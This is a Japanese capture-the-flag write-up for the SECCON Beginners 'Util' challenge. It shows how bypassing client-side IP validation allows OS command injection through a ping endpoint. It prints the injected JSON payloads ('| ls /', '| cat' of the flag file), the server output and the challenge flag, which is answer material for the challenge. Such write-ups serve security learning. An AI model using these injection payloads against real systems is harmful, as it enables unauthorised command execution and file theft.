# Util

## 解法

サイトにアクセスすると IP アドレスを入力すると ping 結果を表示してくれるフォームが出てくるので、
OSコマンドインジェクションが可能ではないかと推測する。

```
192.168.2.1 | ls
```

しかしフォームからでは実行出来ず、JavaScript を確認すると無効化する処理が書かれていることがわかる

```javascript
  function send() {
      var address = document.getElementById("addressTextField").value;

      if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(address)) {
        var json = {};
        json.address = address

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/util/ping");
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(json));

        document.getElementById("notify").innerHTML = "<p>sending...</p>";

        xhr.onload = function () {
          if (xhr.status != 200) {
            document.getElementById("notify").innerHTML =
              "<p>Request Error : " + xhr.response + "</p>";
          } else {
            document.getElementById("notify").innerHTML =
              "<pre><code>" + JSON.parse(xhr.response).result.replaceAll("\n", "<br />") + "</code></pre>";
          }
        };
      } else {
        document.getElementById("notify").innerHTML = "<p>Invalid IP address</p>";
      }
    }

    var init = function () {
      var btn = document.getElementById("submit");
      var popup = function () {
        send();
      };
      btn.addEventListener("click", popup, false);
    };

    window.addEventListener("load", init, false);
```

Postman で 送信

```
https://util.quals.beginners.seccon.jp/util/ping

{"address": "192.168.0.1 | ls /"}
```

ls 結果が表示される。`flag_A74FIBkN9sELAjOc.txt` という名前のファイルがあることが確認できる。

```json
{
    "result": "app\nbin\ndev\netc\nflag_A74FIBkN9sELAjOc.txt\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"
}
```

cat で中身を確認

```
https://util.quals.beginners.seccon.jp/util/ping

{"address": "192.168.0.1 | cat /flag_A74FIBkN9sELAjOc.txt"}
```

フラグを得ることが出来た

```json
{
    "result": "ctf4b{al1_0vers_4re_i1l}\n"
}
```

## フラグ

```
ctf4b{al1_0vers_4re_i1l}
```